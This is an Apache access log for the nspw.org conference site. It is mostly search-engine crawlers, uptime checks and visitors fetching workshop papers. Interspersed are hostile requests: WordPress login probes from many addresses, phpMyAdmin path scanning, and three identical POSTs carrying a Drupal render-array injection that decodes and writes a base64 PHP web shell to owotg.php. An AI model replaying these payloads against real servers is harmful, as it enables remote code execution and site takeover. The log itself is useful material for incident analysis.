www.nspw.org:80 137.112.228.195 - - [01/May/2018:13:24:06 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
www.nspw.org:80 41.221.29.44 - - [01/May/2018:13:24:26 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.221.29.44 - - [01/May/2018:13:24:28 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:13:25:05 -0400] "GET /current/past.shtml HTTP/1.1" 302 565 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:13:25:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 35.224.23.8 - - [01/May/2018:13:25:37 -0400] "GET /papers/2006/nspw2006-crawford.pdf HTTP/1.1" 302 539 "-" "Python/3.5 aiohttp/3.1.3"
www.nspw.org:80 63.249.66.212 - - [01/May/2018:13:25:37 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; changedetection/7.0; +http://www.changedetection.com/bot.html)"
www.nspw.org:80 63.249.66.212 - - [01/May/2018:13:25:38 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; changedetection/7.0; +http://www.changedetection.com/bot.html)"
www.nspw.org:80 114.125.74.210 - - [01/May/2018:13:25:41 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 114.125.74.210 - - [01/May/2018:13:25:43 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 218.161.47.62 - - [01/May/2018:13:28:00 -0400] "HEAD http://134.117.225.17:80/phpmyadmin/ HTTP/1.1" 302 236 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 218.161.47.62 - - [01/May/2018:13:28:00 -0400] "HEAD http://134.117.225.39:80/phpmyadmin/ HTTP/1.1" 302 236 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 218.161.47.62 - - [01/May/2018:13:28:00 -0400] "HEAD http://134.117.225.17:80/PMA/ HTTP/1.1" 302 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 218.161.47.62 - - [01/May/2018:13:28:00 -0400] "HEAD http://134.117.225.39:80/PMA/ HTTP/1.1" 302 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 218.161.47.62 - - [01/May/2018:13:28:00 -0400] "HEAD http://134.117.225.17:80/dbadmin/ HTTP/1.1" 302 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 218.161.47.62 - - [01/May/2018:13:28:00 -0400] "HEAD http://134.117.225.39:80/dbadmin/ HTTP/1.1" 302 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 218.161.47.62 - - [01/May/2018:13:28:00 -0400] "HEAD http://134.117.225.17:80/pma/ HTTP/1.1" 302 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 218.161.47.62 - - [01/May/2018:13:28:00 -0400] "HEAD http://134.117.225.39:80/pma/ HTTP/1.1" 302 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 218.161.47.62 - - [01/May/2018:13:28:00 -0400] "HEAD http://134.117.225.17:80/db/ HTTP/1.1" 302 227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 218.161.47.62 - - [01/May/2018:13:28:01 -0400] "HEAD http://134.117.225.39:80/db/ HTTP/1.1" 302 227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:13:30:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 160.120.40.135 - - [01/May/2018:13:31:17 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 160.120.40.135 - - [01/May/2018:13:31:20 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:13:31:44 -0400] "GET /2009/cfp/cfpExtension.text HTTP/1.1" 302 581 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:13:32:32 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 302 595 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.65.119 - - [01/May/2018:13:33:54 -0400] "GET /2009/proceedings/1994/nspw1994-bertino.pdf HTTP/1.1" 302 609 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 110.138.156.193 - - [01/May/2018:13:34:34 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 110.138.156.193 - - [01/May/2018:13:34:36 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:13:35:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 176.227.95.219 - - [01/May/2018:13:36:08 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 176.227.95.219 - - [01/May/2018:13:36:09 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:13:37:10 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:13:37:22 -0400] "GET /2009/proceedings/1993/nspw1993-strens.pdf HTTP/1.1" 302 611 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:13:37:58 -0400] "GET /proceedings/2006/nspw2006-crawford.pdf HTTP/1.1" 302 605 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:13:38:01 -0400] "GET /2005/pre-proceedings/ivan_flechais.pdf HTTP/1.1" 302 604 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.83 - - [01/May/2018:13:38:12 -0400] "GET /robots.txt HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 141.136.9.93 - - [01/May/2018:13:38:37 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 141.136.9.93 - - [01/May/2018:13:38:39 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 199.16.157.181 - - [01/May/2018:13:39:14 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.181 - - [01/May/2018:13:39:14 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 182.70.244.189 - - [01/May/2018:13:39:45 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 182.70.244.189 - - [01/May/2018:13:39:51 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:13:40:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:13:42:54 -0400] "GET /papers/2000/nspw2000-templeton.pdf HTTP/1.1" 302 597 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 104.196.53.7 - - [01/May/2018:13:43:17 -0400] "HEAD /papers/2008/nspw2008-mannan.pdf HTTP/1.1" 302 219 "http://www.nspw.org/papers/2008/nspw2008-mannan.pdf" "WordPress/4.9.5; http://everifile.wpengine.com"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:13:43:59 -0400] "GET /papers/2012/docs/p141.pdf HTTP/1.1" 302 579 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:13:44:07 -0400] "GET /papers/1997/nspw1997-meadows.pdf HTTP/1.1" 302 593 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:13:45:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:13:45:40 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 302 587 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 103.8.166.222 - - [01/May/2018:13:46:44 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 103.8.166.222 - - [01/May/2018:13:46:47 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:13:48:39 -0400] "GET /2005/cfp/latex/main.ps HTTP/1.1" 302 573 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 182.185.1.52 - - [01/May/2018:13:48:52 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 182.185.1.52 - - [01/May/2018:13:48:53 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 190.114.122.165 - - [01/May/2018:13:49:10 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 190.114.122.165 - - [01/May/2018:13:49:17 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 31.215.83.204 - - [01/May/2018:13:49:36 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 31.215.83.204 - - [01/May/2018:13:49:43 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:13:49:44 -0400] "GET /papers/1997/nspw1997-cheung.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:13:50:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:13:51:05 -0400] "GET /papers/2001/nspw2001-foley.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 118.219.252.195 - - [01/May/2018:13:51:19 -0400] "GET / HTTP/1.1" 302 488 "-" "Python-urllib/2.7"
www.nspw.org:80 77.75.78.164 - - [01/May/2018:13:51:43 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.164 - - [01/May/2018:13:51:46 -0400] "GET /cfp/nspw2010-cfp.pdf HTTP/1.1" 302 569 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.164 - - [01/May/2018:13:51:49 -0400] "GET /2009/index.content HTTP/1.1" 302 564 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.164 - - [01/May/2018:13:51:50 -0400] "GET /node/53 HTTP/1.1" 302 542 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.164 - - [01/May/2018:13:51:50 -0400] "GET /2014 HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 211.115.79.122 - - [01/May/2018:13:52:03 -0400] "GET / HTTP/1.1" 302 525 "-" "Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36"
www.nspw.org:80 5.196.87.138 - - [01/May/2018:13:54:23 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:13:55:19 -0400] "GET /papers/2006/nspw2006-ford.pdf HTTP/1.1" 302 587 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 93.118.243.188 - - [01/May/2018:13:55:30 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 93.118.243.188 - - [01/May/2018:13:55:32 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:13:55:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:13:56:12 -0400] "GET /2005/PC/andreas%20gal.pdf HTTP/1.1" 302 579 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:13:56:20 -0400] "GET /papers/2000/nspw2000-foley.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:13:57:36 -0400] "GET /2005/PC/xin%20zhao.pdf HTTP/1.1" 302 573 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:13:57:39 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 302 595 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.65.115 - - [01/May/2018:13:59:52 -0400] "GET /papers/2011/nspw2011-pieters.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:14:00:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:01:37 -0400] "GET /2009/proceedings/1996/nspw1996-millen.pdf HTTP/1.1" 302 611 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 54.36.148.80 - - [01/May/2018:14:02:45 -0400] "GET /proceedings/2003 HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:14:02:47 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:14:05:14 -0400] "GET /papers/2011/nspw2011-du.pdf HTTP/1.1" 302 583 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:14:05:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:05:38 -0400] "GET /2009/proceedings/2007/nspw2007-solworth.pdf HTTP/1.1" 302 615 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:06:08 -0400] "GET /papers/2008/nspw2008-shirley.pdf HTTP/1.1" 302 593 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:06:44 -0400] "GET /proceedings/2006/nspw2006-greenwald.pdf HTTP/1.1" 302 607 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 157.55.39.242 - - [01/May/2018:14:07:17 -0400] "GET /papers/1997/nspw1997-rahman.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 111.125.208.174 - - [01/May/2018:14:08:13 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 111.125.208.174 - - [01/May/2018:14:08:16 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 124.104.90.234 - - [01/May/2018:14:09:00 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 124.104.90.234 - - [01/May/2018:14:09:01 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:09:13 -0400] "GET /papers/2003/nspw2003-duvarney.pdf HTTP/1.1" 302 595 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:14:10:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:11:12 -0400] "GET /2009/proceedings/2013-pre/explicit-auth.pdf HTTP/1.1" 302 615 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:11:15 -0400] "GET /2005/PC/mahalingam%20ramkumar.pdf HTTP/1.1" 302 594 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:12:58 -0400] "GET /2009/proceedings/1993/nspw1993-hosmer.pdf HTTP/1.1" 302 611 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:13:24 -0400] "GET /papers/2010/nspw2010-bratus.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 43.225.193.10 - - [01/May/2018:14:13:30 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 43.225.193.10 - - [01/May/2018:14:13:34 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:14:15:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:14:16:46 -0400] "GET /2005/cfp/latex/tr.ps HTTP/1.1" 302 569 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 90.240.59.115 - - [01/May/2018:14:17:07 -0400] "GET /2018/cfp HTTP/1.1" 302 545 "https://t.co/huVhoRTvmR" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
www.nspw.org:80 157.55.39.242 - - [01/May/2018:14:17:12 -0400] "GET /papers/1996/nspw1996-hosmer.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 ::1 - - [01/May/2018:14:17:16 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:14:17:17 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:14:17:41 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:14:20:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:14:21:12 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:22:02 -0400] "GET /papers/2012/docs/p87.pdf HTTP/1.1" 302 577 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:14:22:17 -0400] "GET /papers/2009/nspw2009-church.pdf HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 178.135.82.13 - - [01/May/2018:14:22:24 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 178.135.82.13 - - [01/May/2018:14:22:28 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 173.36.240.184 - - [01/May/2018:14:22:47 -0400] "GET /papers/2006/nspw2006-gates.pdf HTTP/1.1" 302 589 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:14:23:18 -0400] "GET /2011 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:14:24:12 -0400] "GET /2010 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 40.77.167.208 - - [01/May/2018:14:24:20 -0400] "GET /2009/proceedings/2012/docs/p127.pdf HTTP/1.1" 302 599 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:14:25:16 -0400] "GET / HTTP/1.1" 302 473 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:14:25:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 40.77.167.208 - - [01/May/2018:14:26:22 -0400] "GET /2009/proceedings/1993/nspw1993-thuraisingham.pdf HTTP/1.1" 302 625 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:26:23 -0400] "GET /2009/proceedings/1994/nspw1994-bertino.pdf HTTP/1.1" 302 613 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:26:36 -0400] "GET /papers/2008/nspw2008-crandall.pdf HTTP/1.1" 302 595 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:14:28:33 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
